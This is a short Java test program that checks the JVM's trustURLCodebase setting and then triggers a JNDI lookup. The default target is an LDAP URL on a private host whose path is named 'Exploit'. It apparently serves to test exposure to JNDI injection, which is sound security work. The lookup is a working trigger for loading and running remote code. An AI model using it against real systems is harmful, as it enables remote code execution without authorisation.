import javax.naming.InitialContext;

public class TestJNDI {
    public static void main(String[] args) throws Exception {
        String ldapUrl = args.length > 0 ? args[0] : "ldap://10.1.60.216:1389/Exploit";
        System.out.println("[*] trustURLCodebase = " +
            System.getProperty("com.sun.jndi.ldap.object.trustURLCodebase"));
        System.out.println("[*] Triggering JNDI lookup: " + ldapUrl);
        try {
            new InitialContext().lookup(ldapUrl);
            System.out.println("[+] Lookup returned");
        } catch (Exception e) {
            System.out.println("[-] Exception: " + e.getClass().getName() + ": " + e.getMessage());
        }
    }
}
